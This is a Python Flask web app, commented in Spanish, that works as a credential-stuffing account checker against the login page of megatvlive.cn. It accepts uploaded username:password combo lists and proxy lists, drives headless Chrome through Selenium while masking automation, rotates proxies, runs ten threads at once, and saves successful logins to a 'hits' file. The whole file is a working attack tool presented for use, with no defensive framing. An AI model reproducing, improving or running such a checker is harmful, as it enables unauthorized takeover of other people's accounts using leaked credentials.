import os
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, render_template, jsonify
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from werkzeug.utils import secure_filename
import uuid
import logging

# ================================
# CONFIG
# ================================
app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = '/tmp/uploads'
app.config['HITS_DIR'] = '/tmp/hits'
URL_LOGIN = "https://megatvlive.cn/megatv/login"
URL_DASHBOARD = "https://megatvlive.cn/megatv/dashboard"
MAX_WORKERS = 10

# Crear carpetas si no existen
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)
os.makedirs(app.config['HITS_DIR'], exist_ok=True)

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ================================
# FLAGS Y LISTA DE NAVEGADORES
# ================================
stop_flag = False
navegadores_activos = []
results = []

# ================================
# Funciones auxiliares
# ================================
def cargar_archivo(ruta):
    if not ruta or not os.path.exists(ruta):
        return []
    with open(ruta, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def crear_navegador(proxy=None):
    chrome_options = Options()
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--headless=true")  # Always headless for server
    if proxy:
        chrome_options.add_argument(f"--proxy-server={proxy}")
    navegador = webdriver.Chrome(options=chrome_options)
    navegadores_activos.append(navegador)
    return navegador

def login_megatv(navegador, usuario, clave):
    try:
        wait = WebDriverWait(navegador, 10)
        navegador.get(URL_LOGIN)

        # Campo usuario
        try:
            campo_usuario = wait.until(EC.presence_of_element_located((By.NAME, "username")))
        except:
            campo_usuario = wait.until(EC.presence_of_element_located(
                (By.CSS_SELECTOR, "input[name='username'], input[name='email'], input[type='text']")))
        campo_usuario.clear()
        campo_usuario.send_keys(usuario)

        # Campo contraseña
        try:
            campo_clave = navegador.find_element(By.NAME, "password")
        except:
            campo_clave = navegador.find_element(By.CSS_SELECTOR, "input[type='password']")
        campo_clave.clear()
        campo_clave.send_keys(clave)

        # Botón login
        try:
            boton_login = navegador.find_element(By.CSS_SELECTOR, "button[type='submit'], button")
            boton_login.click()
        except:
            raise Exception("No se encontró el botón de login")

        return True
    except Exception as e:
        raise Exception(f"Error en login: {e}")

def probar_combo(combo, proxy, hits_file):
    global stop_flag, results
    if stop_flag:
        return

    usuario, clave = combo.split(":", 1)
    navegador = None
    try:
        navegador = crear_navegador(proxy)
        login_megatv(navegador, usuario, clave)
        time.sleep(3)

        if stop_flag:
            return

        if URL_DASHBOARD in navegador.current_url:
            hit = f"{usuario}:{clave}"
            with open(hits_file, "a", encoding="utf-8") as f:
                f.write(hit + "\n")
            results.append(f"✅ HIT -> {usuario}:********")
        else:
            results.append(f"❌ NADA -> {usuario}:********")
    except Exception as e:
        if not stop_flag:
            results.append(f"⚠️ ERROR en {usuario}: {e}")
    finally:
        if navegador:
            try:
                navegador.quit()
            except:
                pass
            if navegador in navegadores_activos:
                navegadores_activos.remove(navegador)

# ================================
# Rutas Flask
# ================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_files():
    global stop_flag, results
    stop_flag = False
    results = []

    if 'combos' not in request.files or 'proxies' not in request.files:
        return jsonify({'error': 'Debes subir ambos archivos (combos y proxies)'}), 400

    combos_file = request.files['combos']
    proxies_file = request.files['proxies']
    usar_proxies = request.form.get('usar_proxies') == 'on'

    if combos_file.filename == '':
        return jsonify({'error': 'Debes seleccionar un archivo de combos'}), 400

    combos_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(combos_file.filename))
    proxies_path = os.path.join(app.config['UPLOAD_FOLDER'], secure_filename(proxies_file.filename))
    combos_file.save(combos_path)
    if proxies_file.filename:
        proxies_file.save(proxies_path)

    combos = cargar_archivo(combos_path)
    proxies = cargar_archivo(proxies_path) if proxies_file.filename else []

    if not combos:
        return jsonify({'error': 'El archivo de combos está vacío'}), 400

    hits_file = os.path.join(app.config['HITS_DIR'], "megatv_hits.txt")

    def worker():
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for i, combo in enumerate(combos):
                if stop_flag:
                    break
                proxy = proxies[i % len(proxies)] if (usar_proxies and proxies) else None
                futures.append(executor.submit(probar_combo, combo, proxy, hits_file))
            for f in futures:
                if stop_flag:
                    break
                f.result()
        results.append("✅ Tarea finalizada")

    threading.Thread(target=worker, daemon=True).start()
    return jsonify({'message': 'Verificación iniciada', 'total': len(combos)})

@app.route('/results')
def get_results():
    return jsonify({'results': results})

@app.route('/stop', methods=['POST'])
def stop_verification():
    global stop_flag, navegadores_activos
    stop_flag = True
    for nav in list(navegadores_activos):
        try:
            nav.quit()
        except:
            pass
        navegadores_activos.remove(nav)
    return jsonify({'message': 'Verificación detenida'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)